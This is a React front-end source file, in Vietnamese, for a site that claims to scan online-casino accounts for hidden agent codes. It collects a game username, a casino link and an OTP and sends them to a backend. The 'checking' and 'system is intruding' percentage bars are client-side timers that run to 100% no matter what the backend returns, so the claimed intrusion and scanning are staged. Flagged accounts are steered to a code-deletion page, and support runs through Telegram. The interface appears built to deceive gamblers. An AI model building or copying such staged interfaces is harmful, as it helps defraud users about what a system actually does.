import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./AppPro.css";

type CheckType =
  | "safe"
  | "agent-first"
  | "agent-second"
  | "agent-third"
  | "agent-external"
  | "belongTotal"
  | string;

type CheckResponse = {
  username: string;
  loginUrl: string;
  type?: CheckType;
  otp?: string;
};

function App() {
  const navigate = useNavigate();
  const [isChecking, setIsChecking] = useState(false);
  const [progress, setProgress] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [account, setAccount] = useState("");
  const [link, setLink] = useState("");
  const [errors, setErrors] = useState({ account: false, link: false });
  const [linkErrorType] = useState<"empty" | "invalid">("empty");
  const [checkResult, setCheckResult] = useState<CheckResponse | null>(null);
  const [apiError, setApiError] = useState<string | null>(null);
  const [otpInput, setOtpInput] = useState("");
  const [otpError, setOtpError] = useState<string | null>(null);
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
  const [nextStep, setNextStep] = useState<"otp" | "result" | null>(null);
  const [showProcessing, setShowProcessing] = useState(false);
  const [processingProgress, setProcessingProgress] = useState(0);
  const [inputMode, setInputMode] = useState<"link" | "select">("link");
  const [showCasinoModal, setShowCasinoModal] = useState(false);
  const [casinoSearch, setCasinoSearch] = useState("");
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const casinos = [
    "XX88",
    "MM88",
    "GG88",
    "J88",
    "AE888",
    "WW88",
    "FUN88",
    "MU88",
    "MB66",
    "CM88",
    "FLY88",
    "8KBET",
    "RR88",
    "JUN88",
    "78WIN",
    "BL555",
    "AU88",
    "DF999",
    "789BET",
    "HI88",
    "SHBET",
    "F8BET",
    "QQ88",
    "NEW88",
    "KUBET",
    "LUCKY88",
    "go88",
    "sunwin",
    "ok9",
    "f168",
    "gk88",
    "6623",
    "s8",
    "u888",
    "sodo",
    "OK8386",
    "C168",
    "OPEN88",
    "SC88",
  ];

  const filteredCasinos = casinos.filter((casino) =>
    casino.toLowerCase().includes(casinoSearch.toLowerCase()),
  );

  const getResultPillText = () => {
    const type = (checkResult?.type ?? "safe").toLowerCase();
    if (type === "agent-first") return "TÀI KHOẢN DÍNH MÃ ĐẠI LÍ CẤP 1";
    if (type === "agent-second") return "TÀI KHOẢN DÍNH MÃ ĐẠI LÍ CẤP 2";
    if (type === "agent-third") return "TÀI KHOẢN DÍNH MÃ ĐẠI LÍ CẤP 3";
    if (type === "agent-external") return "TÀI KHOẢN DÍNH MÃ ĐẠI LÍ NGOÀI";
    if (type === "belongTotal") return "TÀI KHOẢN THUỘC TỔNG";
    return "TÀI KHOẢN AN TOÀN";
  };

  const isAgentType = () => {
    const type = (checkResult?.type ?? "safe").toLowerCase();
    return (
      type === "agent-first" ||
      type === "agent-second" ||
      type === "agent-third" ||
      type === "agent-external"
    );
  };

  const isValidUrl = (string: string): boolean => {
    try {
      const url = new URL(string);
      return url.protocol === "http:" || url.protocol === "https:";
    } catch {
      // Nếu không phải URL đầy đủ, kiểm tra xem có bắt đầu bằng http:// hoặc https:// không
      const trimmed = string.trim();
      return trimmed.startsWith("http://") || trimmed.startsWith("https://");
    }
  };

  const handleCheck = async () => {
    if (isChecking) return;

    const hasAccount = account.trim() !== "";
    const hasLink = link.trim() !== "";

    // Kiểm tra nếu chế độ nhập link thì phải là URL hợp lệ
    const isLinkValid = inputMode === "link" ? isValidUrl(link.trim()) : true;

    if (!hasAccount || !hasLink || !isLinkValid) {
      let message = "";
      if (!hasAccount) {
        message = "Vui lòng nhập tài khoản game";
      } else if (!hasLink) {
        message = "Vui lòng nhập link nhà cái";
      } else if (inputMode === "link" && !isLinkValid) {
        message = "Vui lòng nhập link hợp lệ (http:// hoặc https://)";
      }
      setErrorMessage(message);
      setShowErrorPopup(true);
      return;
    }

    setErrors({ account: false, link: false });
    setCheckResult(null);
    setApiError(null);
    setIsChecking(true);
    setShowResult(false);
    setShowOtpModal(false);
    setNextStep(null);
    setOtpInput("");
    setOtpError(null);
    setProgress(0);

    try {
      const res = await fetch(`${import.meta.env.VITE_API_BASE_URL}/check`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: account.trim(),
          loginUrl: link.trim(),
        }),
      });

      if (!res.ok) {
        // Cố gắng đọc message từ response
        try {
          const errJson = await res.json();
          const errorMessage =
            errJson?.message || errJson?.error || `HTTP ${res.status}`;
          setApiError(errorMessage);
        } catch {
          setApiError(
            `HTTP ${res.status}: Có lỗi xảy ra khi kiểm tra tài khoản`,
          );
        }
        setNextStep("result");
        return;
      }

      const json = await res.json();
      const data = (json.data ?? json) as CheckResponse;

      setCheckResult(data);
      // đánh dấu bước tiếp theo là mở OTP sau khi progress chạy xong
      setNextStep("otp");
    } catch (err) {
      console.error(err);
      // Nếu là lỗi network hoặc parse JSON, dùng message mặc định
      setApiError(
        "Hệ thống đang tạm thời gián đoạn khi kiểm tra tài khoản. Vui lòng thử lại sau hoặc liên hệ bộ phận hỗ trợ.",
      );
      // đánh dấu bước tiếp theo là hiển thị popup kết quả lỗi sau khi progress chạy xong
      setNextStep("result");
    } finally {
      // không tắt isChecking tại đây để cho thanh chạy hết 100%
    }
  };

  useEffect(() => {
    if (!isChecking) return;

    const interval = setInterval(() => {
      setProgress((prev) => {
        // cho sóng chạy dần tới 100%
        const next = Math.min(prev + 7, 100);
        if (next === 100) {
          clearInterval(interval);
        }
        return next;
      });
    }, 120);

    return () => clearInterval(interval);
  }, [isChecking]);

  // Khi progress đã chạy xong và API cũng đã trả về (có nextStep),
  // mới mở popup OTP hoặc popup kết quả.
  useEffect(() => {
    if (!nextStep || progress < 100) return;

    setIsChecking(false);

    if (nextStep === "otp") {
      setShowOtpModal(true);
    } else if (nextStep === "result") {
      setShowResult(true);
    }

    setNextStep(null);
  }, [nextStep, progress]);

  const handleCloseResult = () => {
    setShowResult(false);
  };

  const handleConfirmResult = () => {
    setShowResult(false);
    navigate("/delete-code");
  };

  const handleVerifyOtp = async () => {
    const trimmedOtp = otpInput.trim();

    // Không cho phép để trống OTP
    if (!trimmedOtp) {
      setOtpError("Vui lòng nhập OTP");
      return;
    }

    // Call API /check/verify với username, loginUrl và OTP từ popup
    try {
      setIsVerifyingOtp(true);
      setOtpError(null);
      setApiError(null);

      const res = await fetch(
        `${import.meta.env.VITE_API_BASE_URL}/check/verify`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: account.trim(),
            loginUrl: link.trim(),
            otp: trimmedOtp,
          }),
        },
      );

      if (!res.ok) {
        // Cố gắng đọc message từ response của backend
        try {
          const errJson = await res.json();
          const errorMessage =
            errJson?.message ||
            errJson?.error ||
            "OTP không hợp lệ hoặc đã hết hạn.";
          setOtpError(errorMessage);
        } catch {
          setOtpError("OTP không hợp lệ hoặc đã hết hạn.");
        }
        return;
      }

      const json = await res.json();
      const data = (json.data ?? json) as CheckResponse;

      setCheckResult(data);

      // Nếu backend trả thành công thì đóng popup OTP
      // và hiển thị modal "Hệ thống đang xâm nhập..." rồi mới show kết quả
      setShowOtpModal(false);
      setShowProcessing(true);
      setProcessingProgress(0);
    } catch (err) {
      console.error(err);
      setOtpError(
        "Hệ thống đang tạm thời gián đoạn khi xác thực OTP. Vui lòng thử lại sau hoặc liên hệ hỗ trợ.",
      );
    } finally {
      setIsVerifyingOtp(false);
    }
  };

  // Hiệu ứng modal "Hệ thống đang xâm nhập..."
  useEffect(() => {
    if (!showProcessing) return;

    setProcessingProgress(0);

    const interval = setInterval(() => {
      setProcessingProgress((prev) => {
        // cho % chạy mượt tương tự nút TIẾN HÀNH KIỂM TRA
        const next = Math.min(prev + 7, 100);
        if (next === 100) {
          clearInterval(interval);
          setTimeout(() => {
            setShowProcessing(false);
            setShowResult(true);
          }, 400);
        }
        return next;
      });
    }, 120);

    return () => clearInterval(interval);
  }, [showProcessing]);

  return (
    <main className="app-container">
      <div className="title-image-wrapper">
        <img src="/title.webp" alt="Phần mềm quét mã nguồn đại lý" />
      </div>
      <div className="app-content">
        <div className="app-body-layout">
          <div className="body-side body-side-left">
            <img className="body-side-image" src="/ae-sexy.png" alt="" />
          </div>
          {/* Modal Form */}
          <div className="modal">
          {/* Background Image */}
          <div className="modal-bg-image-mb">
            <img src="/bg-modal-mb.webp" alt="background" />
          </div>
          <div className="modal-bg-image"></div>
          {/* Form Content */}
          <div className="modal-form">
            <div className="modal-heading-badge">CHECK MÃ ẨN</div>
            <div className="formGroupWrapper">
              {/* Input 1: Tài khoản game */}
              <div
                className={`form-group ${
                  errors.account ? "form-group-error" : ""
                }`}
              >
                <div className="form-label-row">
                  <label className="form-label">Tài khoản game</label>
                </div>
                <div className="input-wrapper input-wrapper-select">
                  <input
                    type="text"
                    className={`form-input ${
                      errors.account ? "form-input--error" : ""
                    }`}
                    placeholder={
                      errors.account
                        ? "Vui lòng nhập tài khoản"
                        : "Nhập tài khoản game"
                    }
                    value={account}
                    onChange={(e) => {
                      const value = e.target.value;
                      setAccount(value);
                      if (errors.account && value.trim() !== "") {
                        setErrors((prev) => ({ ...prev, account: false }));
                      }
                    }}
                  />
                </div>
              </div>
              {/* Input 2: Link nhà cái */}
              <div
                className={`form-group ${errors.link ? "form-group-error" : ""}`}
              >
                <div className="form-label-row">
                  <label className="form-label">Link nhà cái</label>
                </div>

                {/* Toggle switch */}
                <div className="input-mode-toggle-wrapper">
                  <div className="input-mode-toggle">
                    <button
                      type="button"
                      className={`toggle-btn ${inputMode === "link" ? "active" : ""}`}
                      onClick={() => {
                        setInputMode("link");
                        setLink("");
                      }}
                    >
                      Nhập Link
                    </button>
                    <button
                      type="button"
                      className={`toggle-btn ${inputMode === "select" ? "active" : ""}`}
                      onClick={() => {
                        setInputMode("select");
                        setLink("");
                      }}
                    >
                      Chọn nhà cái
                    </button>
                  </div>
                </div>
                <div className="input-wrapper">
                  <input
                    type="text"
                    className={`form-input ${
                      errors.link ? "form-input--error" : ""
                    }`}
                    placeholder={
                      inputMode === "link"
                        ? errors.link && linkErrorType === "invalid"
                          ? "Nhập link hợp lệ (http:// hoặc https://)"
                          : errors.link
                            ? "Vui lòng nhập link nhà cái"
                            : "Nhập link nhà cái"
                        : "Chọn nhà cái"
                    }
                    value={link}
                    readOnly
                    onChange={() => {}}
                    onClick={() => {
                      setInputMode("select");
                      setShowCasinoModal(true);
                    }}
                  />
                  <button
                    type="button"
                    className="select-inline-button"
                    onClick={() => {
                      setInputMode("select");
                      setShowCasinoModal(true);
                    }}
                  >
                    Chọn
                  </button>
                </div>
              </div>
              {/* Button với hiệu ứng sóng */}
              <div className="checkingWrapper">
                {isChecking ? (
                  <button
                    className="form-button form-button-checking"
                    onClick={handleCheck}
                    disabled={isChecking}
                  >
                    <span className="form-button-label ">
                      ĐANG KIỂM TRA... {Math.round(progress)}%
                    </span>
                  </button>
                ) : (
                  <button
                    className="form-button-checking btn-check"
                    onClick={handleCheck}
                    disabled={isChecking}
                  >
                    tiến hành kiểm tra
                  </button>
                )}
              </div>
              {/* Social Icons */}
              <div className="social-icons">
                {/* Telegram Icon */}
                <a
                  href="https://t.me/CONGBINH2026"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="social-tele"
                >
                  <img src="/tele-icon.webp" alt="" className="icon-tele" />
                  <span className="social-text">Telegram hỗ trợ</span>
                </a>
                {/* Facebook Icon */}
                <a
                  href="https://www.facebook.com/profile.php?id=61551351983672"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="social-fb"
                >
                  <img src="/fb-icon.webp" alt="Facebook" className="icon-fb" />
                  <span className="social-text">Facebook</span>
                </a>
              </div>
            </div>
          </div>
          </div>
          <div className="body-side body-side-right">
            <img className="body-side-image body-side-image-dg" src="/dg.png" alt="" />
          </div>
        </div>
      </div>

      {/* OTP Verify Modal */}
      {showOtpModal && (
        <div className="otp-overlay">
          <div className="otp-modal">
            <div className="otp-header">
              <div className="otp-title">XÁC THỰC OTP</div>
              <div
                className="otp-close"
                onClick={() => {
                  setShowOtpModal(false);
                }}
              >
                ✕
              </div>
            </div>
            <div className="otp-body">
              <p className="otp-desc">
                Vui lòng nhập mã OTP để xem kết quả kiểm tra.
              </p>
              <input
                type="text"
                className="otp-input"
                placeholder="Nhập OTP"
                value={otpInput}
                onChange={(e) => {
                  setOtpInput(e.target.value);
                  if (otpError) {
                    setOtpError(null);
                  }
                }}
              />
              {otpError && <div className="otp-error-text">{otpError}</div>}
            </div>
            <div className="otp-actions">
              <button
                className="otp-button otp-button-cancel"
                onClick={() => setShowOtpModal(false)}
              >
                HỦY
              </button>
              <button
                className="otp-button otp-button-confirm"
                onClick={handleVerifyOtp}
                disabled={isVerifyingOtp}
              >
                {isVerifyingOtp ? "ĐANG XÁC NHẬN..." : "XÁC NHẬN"}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Result Modal (giữ nguyên, chỉ hiển thị sau khi xác thực OTP thành công) */}
      {showResult && (
        <div className="result-overlay" onClick={handleCloseResult}>
          <div
            className={`result-modal ${isAgentType() ? "result-modal-danger" : ""}`}
            onClick={(e) => {
              e.stopPropagation();
            }}
          >
            <div className="result-icon-circle">
              <img
                src={isAgentType() ? "/danger.png" : "/done.png"}
                alt="Đã check xong"
                className="result-icon-image"
              />
            </div>
            <div className="result-text-top">ĐÃ CHECK XONG</div>

            {apiError && <div className="result-error-text">{apiError}</div>}

            {checkResult && !apiError && (
              <>
                <div
                  className={`result-pill ${isAgentType() ? "result-pill-danger" : ""}`}
                >
                  <span className="result-pill-text">
                    {getResultPillText()}
                  </span>
                </div>
                {checkResult.otp && (
                  <div className="result-text-bottom">
                    OTP: <strong>{checkResult.otp}</strong>
                  </div>
                )}
              </>
            )}

            <button
              className={`result-close-button ${isAgentType() ? "result-close-button-danger" : ""}`}
              onClick={handleConfirmResult}
            >
              {isAgentType() ? "VUI LÒNG HUỶ" : "ĐÓNG"}
            </button>
          </div>
        </div>
      )}
      {/* Processing Modal - Hệ thống đang xâm nhập */}
      {showProcessing && (
        <div className="processing-overlay">
          <div
            className="processing-modal"
            onClick={(e) => {
              e.stopPropagation();
            }}
          >
            <div className="processing-main-text">
              TRONG LÚC KIỂM TRA THÔNG TIN
              <br />
              VUI LÒNG KHÔNG THOÁT RA
            </div>
            <span className="processing-pill-text">
              HỆ THỐNG ĐANG XÂM NHẬP {processingProgress}%
            </span>
            <div className="processing-pill">
              <img src="/processing.gif" alt="processing" />
            </div>
            <div className="processing-sub-text">ĐỢI TRẢ KẾT QUẢ....</div>
          </div>
        </div>
      )}

      {/* Casino Selection Modal */}
      {showCasinoModal && (
        <div
          className="casino-modal-overlay"
          onClick={() => setShowCasinoModal(false)}
        >
          <div
            className="casino-modal"
            onClick={(e) => {
              e.stopPropagation();
            }}
          >
            <div className="casino-modal-header">
              <h2 className="casino-modal-title">Chọn nhà cái</h2>
              <button
                className="casino-modal-close"
                onClick={() => setShowCasinoModal(false)}
              >
                ×
              </button>
            </div>

            <div className="casino-search-wrapper">
              <input
                type="text"
                className="casino-search-input"
                placeholder="Tìm kiếm nhà cái..."
                value={casinoSearch}
                onChange={(e) => setCasinoSearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="casino-list">
              {filteredCasinos.length > 0 ? (
                filteredCasinos.map((casino) => (
                  <button
                    key={casino}
                    type="button"
                    className="casino-item"
                    onClick={() => {
                      setLink(casino);
                      setShowCasinoModal(false);
                      setCasinoSearch("");
                      if (errors.link) {
                        setErrors((prev) => ({ ...prev, link: false }));
                      }
                    }}
                  >
                    {casino}
                  </button>
                ))
              ) : (
                <div className="casino-no-results">Không tìm thấy nhà cái</div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Error Popup */}
      {showErrorPopup && (
        <div
          className="error-popup-overlay"
          onClick={() => setShowErrorPopup(false)}
        >
          <div className="error-popup" onClick={(e) => e.stopPropagation()}>
            <div className="error-popup-content">
              <div className="error-popup-icon">!</div>
              <div className="error-popup-message">{errorMessage}</div>
              <button
                className="error-popup-button"
                onClick={() => setShowErrorPopup(false)}
              >
                Đóng
              </button>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
export default App;
